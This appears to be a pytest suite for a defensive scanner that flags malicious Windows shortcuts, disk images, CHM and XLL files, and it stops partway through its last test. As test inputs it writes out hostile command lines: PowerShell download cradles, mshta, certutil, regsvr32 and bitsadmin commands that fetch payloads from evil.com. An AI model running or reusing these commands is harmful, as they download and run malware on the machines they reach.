"""
Tests for attack_vector_scanner — Sprint 1.4.

Tests cover:
  - .lnk binary parser (synthetic .lnk files)
  - Suspicious .lnk target detection (via _analyze_lnk_data, no file I/O)
  - Disk image (.iso, .img, .vhd, .vhdx) detection
  - CHM and XLL detection
  - Context-aware risk levels
  - File collection logic
  - Finding contract validation
  - Data structure integrity
  - Integration: scan() returns List[Finding]

Note: .lnk analysis tests use _analyze_lnk_data() instead of _analyze_lnk()
to avoid Windows Defender blocking reads of .lnk files with suspicious content
(e.g., regsvr32 squiblydoo, powershell IEX cradle). The binary parser is
tested via _parse_lnk_bytes() which operates on in-memory data.
"""

import os
import sys
import struct
import tempfile
import shutil
import pytest
from typing import List

# Ensure src/ is on the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from scanners.attack_vector_scanner import (
    _parse_lnk_bytes,
    _parse_lnk,
    _analyze_lnk,
    _analyze_lnk_data,
    _analyze_disk_image,
    _analyze_chm,
    _analyze_xll,
    _collect_dangerous_files,
    _is_high_risk_location,
    _safe_filesize,
    DANGEROUS_EXTENSIONS,
    TARGET_EXTENSIONS,
    SUSPICIOUS_LNK_TARGETS,
    _LNK_SUSPICIOUS_PATTERNS,
    _LNK_HEADER_SIZE,
    _LNK_CLSID,
    _HAS_LINK_INFO,
    _HAS_ARGUMENTS,
    _HAS_WORKING_DIR,
    _HAS_RELATIVE_PATH,
    _IS_UNICODE,
    _HAS_LINK_TARGET_ID_LIST,
    scan,
)
from scanner_core.utils import Finding, RiskLevel, IOThrottle


# ---------------------------------------------------------------------------
# .lnk Binary Builder (test helper)
# ---------------------------------------------------------------------------

def _build_lnk_header(link_flags: int) -> bytes:
    """Build a minimal 76-byte .lnk header with given flags."""
    header = struct.pack("<I", 0x4C)           # HeaderSize
    header += _LNK_CLSID                       # LinkCLSID (16 bytes)
    header += struct.pack("<I", link_flags)     # LinkFlags
    header += struct.pack("<I", 0)              # FileAttributes
    header += b'\x00' * 24                      # CreationTime + AccessTime + WriteTime
    header += struct.pack("<I", 0)              # FileSize
    header += struct.pack("<I", 0)              # IconIndex
    header += struct.pack("<I", 1)              # ShowCommand (SW_SHOWNORMAL)
    header += struct.pack("<H", 0)              # HotKey
    header += b'\x00' * 10                      # Reserved1 + Reserved2 + Reserved3
    assert len(header) == 0x4C
    return header


def _build_link_info(target_path: str) -> bytes:
    """Build a minimal LinkInfo structure with LocalBasePath."""
    target_bytes = target_path.encode("ascii") + b'\x00'

    # Minimal VolumeID: size(4) + DriveType(4) + DriveSerial(4) +
    #   VolumeLabelOffset(4) + VolumeLabel(1 null byte)
    volume_id = struct.pack("<IIII", 17, 3, 0, 16) + b'\x00'

    link_info_header_size = 0x1C  # 28 bytes
    volume_id_offset = link_info_header_size
    local_base_path_offset = volume_id_offset + len(volume_id)
    common_suffix_offset = local_base_path_offset + len(target_bytes)

    # Build 28-byte header
    link_info_header = struct.pack(
        "<IIIIIII",
        0,                          # LinkInfoSize (placeholder)
        link_info_header_size,
        0x01,                       # LinkInfoFlags: VolumeIDAndLocalBasePath
        volume_id_offset,
        local_base_path_offset,
        0,                          # CommonNetworkRelativeLinkOffset
        common_suffix_offset,
    )

    body = link_info_header + volume_id + target_bytes + b'\x00'
    # Fix size
    body = struct.pack("<I", len(body)) + body[4:]
    return body


def _build_string_data(text: str, is_unicode: bool = True) -> bytes:
    """Build a single StringData entry (count + chars)."""
    if is_unicode:
        encoded = text.encode("utf-16-le")
        return struct.pack("<H", len(text)) + encoded
    else:
        encoded = text.encode("ascii")
        return struct.pack("<H", len(text)) + encoded


def build_test_lnk(
    target_path: str = "",
    arguments: str = "",
    working_dir: str = "",
    is_unicode: bool = True,
) -> bytes:
    """Build a synthetic .lnk binary for testing.

    Args:
        target_path: Target executable path (stored in LinkInfo).
        arguments: Command-line arguments (stored in StringData).
        working_dir: Working directory (stored in StringData).
        is_unicode: Whether string data uses Unicode encoding.

    Returns:
        Raw bytes of a valid .lnk file.
    """
    flags = 0
    if is_unicode:
        flags |= _IS_UNICODE

    has_link_info = bool(target_path)
    has_args = bool(arguments)
    has_wd = bool(working_dir)

    if has_link_info:
        flags |= _HAS_LINK_INFO
    if has_wd:
        flags |= _HAS_WORKING_DIR
    if has_args:
        flags |= _HAS_ARGUMENTS

    parts = [_build_lnk_header(flags)]

    if has_link_info:
        parts.append(_build_link_info(target_path))

    # StringData order: Name, RelativePath, WorkingDir, Arguments, IconLocation
    if has_wd:
        parts.append(_build_string_data(working_dir, is_unicode))
    if has_args:
        parts.append(_build_string_data(arguments, is_unicode))

    return b''.join(parts)


def _parse_and_analyze(target_path: str, arguments: str = "",
                       working_dir: str = "") -> "Finding | None":
    """Build .lnk bytes, parse in memory, and analyze without file I/O.

    Avoids Windows Defender blocking reads of files with suspicious content.
    """
    data = build_test_lnk(
        target_path=target_path,
        arguments=arguments,
        working_dir=working_dir,
    )
    lnk_data = _parse_lnk_bytes(data)
    if not lnk_data:
        return None
    return _analyze_lnk_data(lnk_data, f"C:\\fake\\test.lnk")


# ---------------------------------------------------------------------------
# Test: .lnk Parser
# ---------------------------------------------------------------------------

class TestLnkParser:
    """Test the .lnk binary parser with synthetic files."""

    def test_invalid_too_short(self):
        """Data shorter than header -> None."""
        assert _parse_lnk_bytes(b'\x00' * 10) is None

    def test_invalid_header_size(self):
        """Wrong header size -> None."""
        data = struct.pack("<I", 0x50) + b'\x00' * 72
        assert _parse_lnk_bytes(data) is None

    def test_invalid_clsid(self):
        """Wrong CLSID -> None."""
        data = struct.pack("<I", 0x4C) + b'\xFF' * 16 + b'\x00' * 56
        assert _parse_lnk_bytes(data) is None

    def test_minimal_valid_header(self):
        """Bare header with no optional sections -> empty result."""
        data = _build_lnk_header(0)
        result = _parse_lnk_bytes(data)
        assert result is not None
        assert result["target_path"] == ""
        assert result["arguments"] == ""

    def test_target_path_from_link_info(self):
        """LinkInfo with LocalBasePath -> target_path extracted."""
        data = build_test_lnk(target_path="C:\\Windows\\System32\\cmd.exe")
        result = _parse_lnk_bytes(data)
        assert result is not None
        assert "cmd.exe" in result["target_path"]

    def test_arguments_unicode(self):
        """Unicode StringData arguments -> correctly decoded."""
        data = build_test_lnk(
            target_path="C:\\Windows\\System32\\cmd.exe",
            arguments="/c echo hello world",
        )
        result = _parse_lnk_bytes(data)
        assert result is not None
        assert "/c echo hello world" in result["arguments"]

    def test_arguments_ascii(self):
        """ASCII StringData arguments -> correctly decoded."""
        data = build_test_lnk(
            target_path="C:\\Windows\\System32\\cmd.exe",
            arguments="/c whoami",
            is_unicode=False,
        )
        result = _parse_lnk_bytes(data)
        assert result is not None
        assert "/c whoami" in result["arguments"]

    def test_working_dir(self):
        """Working directory stored in StringData -> extracted."""
        data = build_test_lnk(
            target_path="C:\\test.exe",
            working_dir="C:\\Users\\Test",
        )
        result = _parse_lnk_bytes(data)
        assert result is not None
        assert "C:\\Users\\Test" in result["working_dir"]

    def test_combined_fields(self):
        """All fields set -> all extracted."""
        data = build_test_lnk(
            target_path="C:\\Windows\\System32\\powershell.exe",
            arguments="-enc SGVsbG8=",
            working_dir="C:\\Users\\victim\\Desktop",
        )
        result = _parse_lnk_bytes(data)
        assert result is not None
        assert "powershell.exe" in result["target_path"]
        assert "-enc SGVsbG8=" in result["arguments"]
        assert "Desktop" in result["working_dir"]

    def test_empty_arguments(self):
        """Target without arguments -> arguments is empty."""
        data = build_test_lnk(target_path="C:\\test.exe")
        result = _parse_lnk_bytes(data)
        assert result is not None
        assert result["arguments"] == ""

    def test_parse_lnk_from_file(self):
        """_parse_lnk reads benign .lnk from disk correctly."""
        data = build_test_lnk(
            target_path="C:\\Windows\\notepad.exe",
            arguments="test.txt",
        )
        with tempfile.NamedTemporaryFile(suffix=".lnk", delete=False) as f:
            f.write(data)
            tmppath = f.name
        try:
            result = _parse_lnk(tmppath)
            assert result is not None
            assert "notepad.exe" in result["target_path"]
            assert "test.txt" in result["arguments"]
        finally:
            os.unlink(tmppath)

    def test_parse_lnk_nonexistent_file(self):
        """Non-existent file -> None."""
        result = _parse_lnk("C:\\nonexistent\\fake.lnk")
        assert result is None

    def test_parse_lnk_empty_file(self):
        """Empty file -> None."""
        with tempfile.NamedTemporaryFile(suffix=".lnk", delete=False) as f:
            tmppath = f.name
        try:
            result = _parse_lnk(tmppath)
            assert result is None
        finally:
            os.unlink(tmppath)

    def test_long_arguments(self):
        """Long argument string -> correctly parsed."""
        long_args = "A" * 500
        data = build_test_lnk(
            target_path="C:\\test.exe",
            arguments=long_args,
        )
        result = _parse_lnk_bytes(data)
        assert result is not None
        assert result["arguments"] == long_args

    def test_special_chars_in_arguments(self):
        """Arguments with special characters -> parsed correctly."""
        args = "-w hidden -nop IEX(New-Object Net.WebClient).DownloadString('http://x')"
        data = build_test_lnk(
            target_path="C:\\Windows\\powershell.exe",
            arguments=args,
        )
        result = _parse_lnk_bytes(data)
        assert result is not None
        assert result["arguments"] == args


# ---------------------------------------------------------------------------
# Test: .lnk Suspicious Target Analysis (via _analyze_lnk_data, no file I/O)
# ---------------------------------------------------------------------------

class TestAnalyzeLnkData:
    """Test _analyze_lnk_data with in-memory parsed data.

    Uses _parse_and_analyze() to avoid Windows Defender blocking reads
    of temp files with suspicious .lnk content.
    """

    def test_powershell_encoded(self):
        """PowerShell with -enc -> HIGH finding."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\powershell.exe",
            "-enc SGVsbG8gV29ybGQ=",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH

    def test_cmd_execution(self):
        """cmd.exe /c -> finding generated."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\cmd.exe",
            "/c whoami > output.txt",
        )
        assert finding is not None
        assert finding.risk in (RiskLevel.HIGH, RiskLevel.MEDIUM)

    def test_mshta_javascript(self):
        """mshta javascript: -> HIGH finding."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\mshta.exe",
            "javascript:alert(1)",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH

    def test_mshta_vbscript(self):
        """mshta vbscript: -> HIGH finding."""
        finding = _parse_and_analyze(
            "C:\\Windows\\mshta.exe",
            "vbscript:Execute(\"MsgBox 1\")",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH

    def test_mshta_http(self):
        """mshta http: -> HIGH finding."""
        finding = _parse_and_analyze(
            "C:\\Windows\\mshta.exe",
            "http://evil.com/payload.hta",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH

    def test_certutil_urlcache(self):
        """certutil -urlcache -> HIGH finding."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\certutil.exe",
            "-urlcache -split -f http://evil.com/payload.exe",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH

    def test_suspicious_target_no_args(self):
        """Bare interpreter shortcut with no args -> None (benign OS shortcut)."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\wscript.exe",
        )
        assert finding is None

    def test_suspicious_target_with_benign_args(self):
        """Suspicious target with non-empty but non-flagged args -> MEDIUM."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\wscript.exe",
            "C:\\scripts\\legit.vbs",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.MEDIUM

    def test_benign_target_returns_none(self):
        """Non-suspicious target (notepad) -> None."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\notepad.exe",
            "readme.txt",
        )
        assert finding is None

    def test_empty_target_returns_none(self):
        """Empty target -> None."""
        lnk_data = {"target_path": "", "arguments": "", "working_dir": "", "icon_location": ""}
        finding = _analyze_lnk_data(lnk_data, "C:\\fake.lnk")
        assert finding is None

    def test_finding_has_correct_module(self):
        """Finding module must be 'Attack Vector Scanner'."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\powershell.exe",
            "-w hidden -enc ABC",
        )
        assert finding is not None
        assert finding.module == "Attack Vector Scanner"
        assert finding.mitre_id == "T1204.002"

    def test_powershell_hidden_window(self):
        """PowerShell -w hidden -> pattern matched."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\powershell.exe",
            "-w hidden -nop IEX(New-Object Net.WebClient).DownloadString('http://x')",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH
        # Should match multiple patterns
        patterns = finding.details.get("matched_patterns", "")
        assert "hidden" in patterns.lower()

    def test_regsvr32_scriptlet(self):
        """regsvr32 /s /i: -> HIGH finding."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\regsvr32.exe",
            "/s /n /u /i:http://evil.com/file.sct scrobj.dll",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH

    def test_bitsadmin_transfer(self):
        """bitsadmin /transfer -> HIGH finding."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\bitsadmin.exe",
            "/transfer job1 http://evil.com/mal.exe C:\\mal.exe",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH

    def test_certutil_decode(self):
        """certutil -decode -> HIGH finding."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\certutil.exe",
            "-decode encoded.txt payload.exe",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH

    def test_powershell_downloadstring(self):
        """PowerShell downloadstring -> HIGH finding."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\powershell.exe",
            "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH

    def test_powershell_frombase64string(self):
        """PowerShell frombase64string -> HIGH finding."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\powershell.exe",
            "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SGVsbG8='))",
        )
        assert finding is not None
        assert finding.risk == RiskLevel.HIGH

    def test_details_truncation(self):
        """Long arguments truncated to 500 chars in details."""
        long_args = "A" * 1000
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\cmd.exe",
            f"/c {long_args}",
        )
        assert finding is not None
        assert len(finding.details["arguments"]) <= 500

    def test_multiple_patterns_matched(self):
        """Multiple suspicious patterns -> all listed in details."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\powershell.exe",
            "-enc SGVsbG8= -w hidden IEX(stuff)",
        )
        assert finding is not None
        patterns = finding.details.get("matched_patterns", "")
        # Should match -enc, -w hidden, and IEX
        assert "encoded" in patterns.lower()
        assert "hidden" in patterns.lower()
        assert "invoke" in patterns.lower()


# ---------------------------------------------------------------------------
# Test: _analyze_lnk file-based (benign .lnk only)
# ---------------------------------------------------------------------------

class TestAnalyzeLnkFile:
    """Test _analyze_lnk with actual file I/O — benign targets only.

    Only benign targets are tested on disk because Windows Defender
    blocks reads of .lnk files with known-malicious content patterns.
    """

    def _write_lnk(self, target: str, arguments: str = "") -> str:
        """Write a test .lnk file and return its path."""
        data = build_test_lnk(target_path=target, arguments=arguments)
        fd, path = tempfile.mkstemp(suffix=".lnk")
        os.write(fd, data)
        os.close(fd)
        return path

    def test_benign_notepad(self):
        """Benign notepad .lnk -> None."""
        path = self._write_lnk("C:\\Windows\\notepad.exe", "file.txt")
        try:
            finding = _analyze_lnk(path)
            assert finding is None
        finally:
            os.unlink(path)

    def test_benign_explorer(self):
        """Benign explorer .lnk -> None."""
        path = self._write_lnk("C:\\Windows\\explorer.exe", "C:\\Users")
        try:
            finding = _analyze_lnk(path)
            assert finding is None
        finally:
            os.unlink(path)

    def test_bare_interpreter_from_file(self):
        """Bare interpreter .lnk (no args) from file -> None (benign)."""
        path = self._write_lnk("C:\\Windows\\System32\\cmd.exe")
        try:
            finding = _analyze_lnk(path)
            assert finding is None
        finally:
            os.unlink(path)

    def test_suspicious_target_with_args_from_file(self):
        """Suspicious target .lnk with matched pattern args -> HIGH."""
        path = self._write_lnk("C:\\Windows\\System32\\cmd.exe", "/c whoami")
        try:
            finding = _analyze_lnk(path)
            assert finding is not None
            assert finding.risk == RiskLevel.HIGH
        finally:
            os.unlink(path)


# ---------------------------------------------------------------------------
# Test: Disk Image Detection
# ---------------------------------------------------------------------------

class TestDiskImageDetection:
    """Test disk image file (.iso, .img, .vhd, .vhdx) analysis."""

    def _create_file(self, ext: str, directory: str = None) -> str:
        """Create a dummy file with the given extension."""
        if directory is None:
            directory = tempfile.gettempdir()
        fd, path = tempfile.mkstemp(suffix=ext, dir=directory)
        os.write(fd, b'\x00' * 1024)
        os.close(fd)
        return path

    def test_iso_detected(self):
        """ISO file -> finding with correct MITRE ID."""
        path = self._create_file(".iso")
        try:
            finding = _analyze_disk_image(path, ".iso")
            assert finding.module == "Attack Vector Scanner"
            assert finding.mitre_id == "T1553.005"
            assert "ISO" in finding.title
        finally:
            os.unlink(path)

    def test_img_detected(self):
        """IMG file -> finding generated."""
        path = self._create_file(".img")
        try:
            finding = _analyze_disk_image(path, ".img")
            assert finding.mitre_id == "T1553.005"
            assert "IMG" in finding.title
        finally:
            os.unlink(path)

    def test_vhd_always_high(self):
        """VHD in any location -> HIGH risk."""
        path = self._create_file(".vhd")
        try:
            finding = _analyze_disk_image(path, ".vhd")
            assert finding.risk == RiskLevel.HIGH
        finally:
            os.unlink(path)

    def test_vhdx_always_high(self):
        """VHDX in any location -> HIGH risk."""
        path = self._create_file(".vhdx")
        try:
            finding = _analyze_disk_image(path, ".vhdx")
            assert finding.risk == RiskLevel.HIGH
        finally:
            os.unlink(path)

    def test_iso_in_temp_is_high(self):
        """ISO in Temp directory -> HIGH risk."""
        path = self._create_file(".iso")
        try:
            finding = _analyze_disk_image(path, ".iso")
            if "temp" in path.lower():
                assert finding.risk == RiskLevel.HIGH
        finally:
            os.unlink(path)

    def test_details_contain_path(self):
        """Finding details must include file path."""
        path = self._create_file(".iso")
        try:
            finding = _analyze_disk_image(path, ".iso")
            assert finding.details["path"] == path
            assert finding.details["extension"] == ".iso"
        finally:
            os.unlink(path)

    def test_motw_bypass_in_description(self):
        """Description mentions MOTW bypass."""
        path = self._create_file(".vhd")
        try:
            finding = _analyze_disk_image(path, ".vhd")
            desc_lower = finding.description.lower()
            assert "motw" in desc_lower or "mark of the web" in desc_lower
        finally:
            os.unlink(path)


# ---------------------------------------------------------------------------
# Test: CHM Detection
# ---------------------------------------------------------------------------

class TestChmDetection:
    """Test .chm file analysis."""

    def test_chm_detected(self):
        """CHM file -> HIGH finding with T1218.001."""
        fd, path = tempfile.mkstemp(suffix=".chm")
        os.write(fd, b'\x00' * 512)
        os.close(fd)
        try:
            finding = _analyze_chm(path)
            assert finding.risk == RiskLevel.HIGH
            assert finding.mitre_id == "T1218.001"
            assert "CHM" in finding.title or "chm" in finding.title.lower()
        finally:
            os.unlink(path)

    def test_chm_module_name(self):
        """CHM finding module = Attack Vector Scanner."""
        fd, path = tempfile.mkstemp(suffix=".chm")
        os.write(fd, b'\x00' * 64)
        os.close(fd)
        try:
            finding = _analyze_chm(path)
            assert finding.module == "Attack Vector Scanner"
        finally:
            os.unlink(path)

    def test_chm_remediation_present(self):
        """CHM finding has remediation text."""
        fd, path = tempfile.mkstemp(suffix=".chm")
        os.write(fd, b'\x00' * 64)
        os.close(fd)
        try:
            finding = _analyze_chm(path)
            assert finding.remediation
            assert len(finding.remediation) > 10
        finally:
            os.unlink(path)


# ---------------------------------------------------------------------------
# Test: XLL Detection
# ---------------------------------------------------------------------------

class TestXllDetection:
    """Test .xll file analysis."""

    def test_xll_detected(self):
        """XLL file -> HIGH finding with T1137.006."""
        fd, path = tempfile.mkstemp(suffix=".xll")
        os.write(fd, b'\x00' * 256)
        os.close(fd)
        try:
            finding = _analyze_xll(path)
            assert finding.risk == RiskLevel.HIGH
            assert finding.mitre_id == "T1137.006"
            assert "XLL" in finding.title or "xll" in finding.title.lower()
        finally:
            os.unlink(path)

    def test_xll_description_mentions_dll(self):
        """XLL description mentions native DLL execution."""
        fd, path = tempfile.mkstemp(suffix=".xll")
        os.write(fd, b'\x00' * 256)
        os.close(fd)
        try:
            finding = _analyze_xll(path)
            assert "dll" in finding.description.lower() or "code" in finding.description.lower()
        finally:
            os.unlink(path)


# ---------------------------------------------------------------------------
# Test: Context-Aware Risk Levels
# ---------------------------------------------------------------------------

class TestContextAwareRisk:
    """Test that risk levels are adjusted based on file location."""

    def test_high_risk_location_temp(self):
        """Path with \\Temp -> high risk location."""
        assert _is_high_risk_location("C:\\Users\\Test\\AppData\\Local\\Temp\\file.iso")

    def test_high_risk_location_appdata(self):
        """Path with \\AppData -> high risk location."""
        assert _is_high_risk_location("C:\\Users\\Test\\AppData\\Roaming\\file.img")

    def test_high_risk_location_public(self):
        """Path with \\Public -> high risk location."""
        assert _is_high_risk_location("C:\\Users\\Public\\file.iso")

    def test_not_high_risk_downloads(self):
        """Downloads dir -> NOT high risk (no marker match)."""
        assert not _is_high_risk_location("C:\\Users\\Test\\Downloads\\ubuntu.iso")

    def test_not_high_risk_desktop(self):
        """Desktop dir -> NOT high risk."""
        assert not _is_high_risk_location("C:\\Users\\Test\\Desktop\\installer.iso")


# ---------------------------------------------------------------------------
# Test: File Collection
# ---------------------------------------------------------------------------

class TestFileCollection:
    """Test _collect_dangerous_files with temp directories."""

    def test_collects_target_extensions(self):
        """Files with target extensions are collected."""
        tmpdir = tempfile.mkdtemp()
        try:
            for ext in [".iso", ".img", ".chm", ".xll", ".lnk", ".vhd", ".vhdx"]:
                with open(os.path.join(tmpdir, f"test{ext}"), "wb") as f:
                    f.write(b'\x00' * 64)
            with open(os.path.join(tmpdir, "test.txt"), "w") as f:
                f.write("hello")

            throttle = IOThrottle(ops_per_batch=1000, sleep_seconds=0)
            files = _collect_dangerous_files([tmpdir], throttle)

            exts = {ext for _, ext in files}
            assert ".iso" in exts
            assert ".img" in exts
            assert ".chm" in exts
            assert ".xll" in exts
            assert ".lnk" in exts
            assert ".vhd" in exts
            assert ".vhdx" in exts
            assert ".txt" not in exts
            assert len(files) == 7
        finally:
            shutil.rmtree(tmpdir)

    def test_skips_node_modules(self):
        """Files inside node_modules are skipped."""
        tmpdir = tempfile.mkdtemp()
        try:
            nm_dir = os.path.join(tmpdir, "node_modules")
            os.makedirs(nm_dir)
            with open(os.path.join(nm_dir, "test.iso"), "wb") as f:
                f.write(b'\x00' * 64)

            throttle = IOThrottle(ops_per_batch=1000, sleep_seconds=0)
            files = _collect_dangerous_files([tmpdir], throttle)
            assert len(files) == 0
        finally:
            shutil.rmtree(tmpdir)

    def test_empty_directory(self):
        """Empty directory -> no files collected."""
        tmpdir = tempfile.mkdtemp()
        try:
            throttle = IOThrottle(ops_per_batch=1000, sleep_seconds=0)
            files = _collect_dangerous_files([tmpdir], throttle)
            assert len(files) == 0
        finally:
            shutil.rmtree(tmpdir)

    def test_deduplicates_directories(self):
        """Same directory passed twice -> scanned only once."""
        tmpdir = tempfile.mkdtemp()
        try:
            with open(os.path.join(tmpdir, "test.iso"), "wb") as f:
                f.write(b'\x00' * 64)

            throttle = IOThrottle(ops_per_batch=1000, sleep_seconds=0)
            files = _collect_dangerous_files([tmpdir, tmpdir], throttle)
            assert len(files) == 1
        finally:
            shutil.rmtree(tmpdir)

    def test_nested_files_collected(self):
        """Files in subdirectories are collected."""
        tmpdir = tempfile.mkdtemp()
        try:
            subdir = os.path.join(tmpdir, "sub1", "sub2")
            os.makedirs(subdir)
            with open(os.path.join(subdir, "deep.vhdx"), "wb") as f:
                f.write(b'\x00' * 64)

            throttle = IOThrottle(ops_per_batch=1000, sleep_seconds=0)
            files = _collect_dangerous_files([tmpdir], throttle)
            assert len(files) == 1
            assert files[0][1] == ".vhdx"
        finally:
            shutil.rmtree(tmpdir)


# ---------------------------------------------------------------------------
# Test: Data Structure Integrity
# ---------------------------------------------------------------------------

class TestDataStructures:
    """Test module-level data structures and constants."""

    def test_all_seven_extensions(self):
        """DANGEROUS_EXTENSIONS has all 7 target extensions."""
        expected = {".lnk", ".iso", ".img", ".vhd", ".vhdx", ".chm", ".xll"}
        assert set(DANGEROUS_EXTENSIONS.keys()) == expected

    def test_target_extensions_match(self):
        """TARGET_EXTENSIONS equals keys of DANGEROUS_EXTENSIONS."""
        assert TARGET_EXTENSIONS == set(DANGEROUS_EXTENSIONS.keys())

    def test_each_extension_has_metadata(self):
        """Each extension entry has name, mitre, description."""
        for ext, info in DANGEROUS_EXTENSIONS.items():
            assert "name" in info, f"{ext} missing 'name'"
            assert "mitre" in info, f"{ext} missing 'mitre'"
            assert "description" in info, f"{ext} missing 'description'"
            assert info["mitre"].startswith("T"), f"{ext} bad MITRE ID"

    def test_suspicious_lnk_targets_are_lowercase(self):
        """All entries in SUSPICIOUS_LNK_TARGETS are lowercase."""
        for name in SUSPICIOUS_LNK_TARGETS:
            assert name == name.lower(), f"'{name}' is not lowercase"

    def test_suspicious_patterns_are_compiled(self):
        """All pattern entries are compiled regex + description tuples."""
        for item in _LNK_SUSPICIOUS_PATTERNS:
            assert isinstance(item, tuple)
            assert len(item) == 2
            pattern, desc = item
            assert hasattr(pattern, "search")
            assert isinstance(desc, str)
            assert len(desc) > 0

    def test_lnk_header_size(self):
        """LNK header size is 0x4C (76 bytes)."""
        assert _LNK_HEADER_SIZE == 0x4C

    def test_lnk_clsid_length(self):
        """LNK CLSID is 16 bytes."""
        assert len(_LNK_CLSID) == 16


# ---------------------------------------------------------------------------
# Test: Finding Contract
# ---------------------------------------------------------------------------

class TestFindingContract:
    """Ensure all analysis functions produce valid Finding objects."""

    def _make_temp_file(self, ext: str) -> str:
        fd, path = tempfile.mkstemp(suffix=ext)
        os.write(fd, b'\x00' * 256)
        os.close(fd)
        return path

    def test_disk_image_finding_fields(self):
        """Disk image finding has all required fields."""
        path = self._make_temp_file(".iso")
        try:
            f = _analyze_disk_image(path, ".iso")
            assert isinstance(f, Finding)
            assert f.module == "Attack Vector Scanner"
            assert isinstance(f.risk, RiskLevel)
            assert f.title
            assert f.description
            assert f.mitre_id
            assert f.remediation
            assert "path" in f.details
            assert "extension" in f.details
        finally:
            os.unlink(path)

    def test_chm_finding_fields(self):
        """CHM finding has all required fields."""
        path = self._make_temp_file(".chm")
        try:
            f = _analyze_chm(path)
            assert isinstance(f, Finding)
            assert f.module == "Attack Vector Scanner"
            assert isinstance(f.risk, RiskLevel)
            assert f.title
            assert f.description
            assert f.mitre_id
        finally:
            os.unlink(path)

    def test_xll_finding_fields(self):
        """XLL finding has all required fields."""
        path = self._make_temp_file(".xll")
        try:
            f = _analyze_xll(path)
            assert isinstance(f, Finding)
            assert f.module == "Attack Vector Scanner"
            assert isinstance(f.risk, RiskLevel)
            assert f.title
            assert f.description
            assert f.mitre_id
        finally:
            os.unlink(path)

    def test_lnk_finding_fields(self):
        """Suspicious .lnk finding has all required fields (in-memory)."""
        finding = _parse_and_analyze(
            "C:\\Windows\\System32\\powershell.exe",
            "-enc SGVsbG8=",
        )
        assert isinstance(finding, Finding)
        assert finding.module == "Attack Vector Scanner"
        assert isinstance(finding.risk, RiskLevel)
        assert finding.title
        assert finding.description
        assert finding.mitre_id == "T1204.002"
        assert "target" in finding.details
        assert "arguments" in finding.details
        assert "matched_patterns" in finding.details


# ---------------------------------------------------------------------------
# Test: Utility Functions
# ---------------------------------------------------------------------------

class TestUtilities:
    """Test helper functions."""

    def test_safe_filesize_bytes(self):
        """Small file -> size in bytes."""
        fd, path = tempfile.mkstemp()
        os.write(fd, b'\x00' * 500)
        os.close(fd)
        try:
            result = _safe_filesize(path)
            assert "500" in result
            assert "B" in result
        finally:
            os.unlink(path)

    def test_safe_filesize_kb(self):
        """Medium file -> size in KB."""
        fd, path = tempfile.mkstemp()
        os.write(fd, b'\x00' * 5000)
        os.close(fd)
        try:
            result = _safe_filesize(path)
            assert "KB" in result
        finally:
            os.unlink(path)

    def test_safe_filesize_nonexistent(self):
        """Non-existent file -> 'Unknown'."""
        assert _safe_filesize("C:\\nonexistent\\file.txt") == "Unknown"


# ---------------------------------------------------------------------------
# Test: Module Integration
# ---------------------------------------------------------------------------

class TestIntegration:
    """Integration tests for scan() function."""

    def test_scan_returns_list(self):
        """scan() must return a List[Finding]."""
        result = scan()
        assert isinstance(result, list)
        for f in result:
            assert isinstance(f, Finding)

    def test_scan_with_planted_files(self):
        """scan() detects planted dangerous files in temp dir."""
        tmpdir = tempfile.gettempdir()
        test_file = os.path.join(tmpdir, "test_corvus_sprint14.xll")
        try:
            with open(test_file, "wb") as f:
                f.write(b'\x00' * 256)

            result = scan()
            xll_findings = [
                f for f in result
                if "test_corvus_sprint14.xll" in f.details.get("path", "")
            ]
            assert len(xll_findings) >= 1, "Planted XLL file should be detected"
            assert xll_findings[0].mitre_id == "T1137.006"
        finally:
            if os.path.exists(test_file):
                os.unlink(test_file)


# ---------------------------------------------------------------------------
# Test: .lnk Suspicious Pattern Coverage
# ---------------------------------------------------------------------------

class TestLnkPatternCoverage:
    """Ensure all suspicious .lnk patterns are properly matched."""

    def test_pattern_powershell_enc(self):
        f = _parse_and_analyze("C:\\powershell.exe", "-enc ABC123")
        assert f is not None
        assert "encoded" in f.details["matched_patterns"].lower()

    def test_pattern_powershell_hidden(self):
        f = _parse_and_analyze("C:\\powershell.exe", "-w hidden")
        assert f is not None
        assert "hidden" in f.details["matched_patterns"].lower()

    def test_pattern_iex(self):
        f = _parse_and_analyze("C:\\powershell.exe", "IEX (blah)")
        assert f is not None
        assert "invoke" in f.details["matched_patterns"].lower()

    def test_pattern_downloadstring(self):
        f = _parse_and_analyze("C:\\powershell.exe", "downloadstring")
        assert f is not None
        assert "download" in f.details["matched_patterns"].lower()

    def test_pattern_frombase64string(self):
        f = _parse_and_analyze("C:\\powershell.exe", "frombase64string")
        assert f is not None
        assert "base64" in f.details["matched_patterns"].lower()

    def test_pattern_cmd_c(self):
        f = _parse_and_analyze("C:\\cmd.exe", "/c whoami")
